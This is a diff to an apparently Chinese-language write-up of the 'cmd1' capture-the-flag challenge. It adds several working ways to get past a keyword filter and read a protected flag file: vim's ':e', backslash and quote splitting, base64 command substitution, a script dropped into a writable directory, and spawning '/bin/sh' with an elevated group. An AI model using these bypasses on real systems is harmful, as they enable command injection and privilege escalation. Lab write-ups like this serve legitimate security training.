@@ -95,6 +95,42 @@ mommy now I get what PATH environment is for :)
 cmd1@ubuntu:~$ env x='/bin/cat /home/cmd1/flag' ./cmd1 "\$x"
 mommy now I get what PATH environment is for :)
 
+#借助vim来打开文件
+./cmd1 /usr/bin/vim
+:e flag
+
+# 转义一个不需要转义的字符 如\a
+cmd1@ubuntu:~$ ./cmd1 "/bin/cat fl\ag"
+mommy now I get what PATH environment is for :)
+
+# base64 decode
+cmd1@ubuntu:~$ ./cmd1 '/bin/cat $(echo "ZmxhZwo=" | /usr/bin/base64 -d)'
+mommy now I get what PATH environment is for :)
+
+# 直接写bash，简单粗暴 by v4r4n
+cmd1@ubuntu:~$ echo /bin/cat /home/cmd1/flag > /var/lib/php/sessions/asd
+cmd1@ubuntu:~$ chmod +x /var/lib/php/sessions/asd
+cmd1@ubuntu:~$ ./cmd1 /var/lib/php/sessions/asd
+mommy now I get what PATH environment is for :)
+
+# more 查看当前目录下所有文件
+./cmd1 "/bin/more *"
 ...
+
+```
+
+也有一个不太理解的。/bin/sh有cmd1_pwn权限，/bin/bash没有。
+
+```bash
+cmd1@ubuntu:~$ ./cmd1 "/bin/bas''h"
+bash-4.3$ /usr/bin/id
+uid=1025(cmd1) gid=1025(cmd1) groups=1025(cmd1)
+bash-4.3$ exit
+exit
+cmd1@ubuntu:~$ ./cmd1 "/bin/s''h"
+$ /usr/bin/id
+uid=1025(cmd1) gid=1025(cmd1) egid=1026(cmd1_pwn) groups=1026(cmd1_pwn),1025(cmd1)
+$ /bin/cat flag
+mommy now I get what PATH environment is for :)
 ```
 
